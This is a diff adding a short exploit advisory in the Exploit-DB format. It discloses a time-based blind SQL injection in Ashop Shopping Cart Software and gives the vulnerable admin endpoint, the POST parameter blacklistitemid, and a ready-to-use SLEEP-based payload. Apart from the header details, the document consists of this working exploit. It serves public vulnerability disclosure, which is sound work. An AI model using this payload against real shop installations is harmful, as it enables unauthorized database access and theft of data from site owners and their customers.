@@ -1,0 +1,18 @@
+# Exploit Title: Ashop Shopping Cart Software - SQL Injection
+# Date: 08.04.2019
+# Exploit Author: Doğukan Karaciğer
+# Vendor Homepage: http://www.ashopsoftware.com
+# Software Link: https://sourceforge.net/projects/ashop/
+# Demo Site: http://demo.ashopsoftware.com/
+# Version: Lastest
+# Tested on: Ubuntu-trusty-64
+# CVE: N/A
+
+----- PoC: SQLi -----
+
+Request: http://localhost/[PATH]/admin/bannedcustomers.php
+Parameter: blacklistitemid (POST)
+Type: AND/OR time-based blind
+Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+Payload: blacklistitem=1&deletebutton=Delete&blacklistitemid=1 AND (SELECT
+* FROM (SELECT(SLEEP(5)))MGvE)
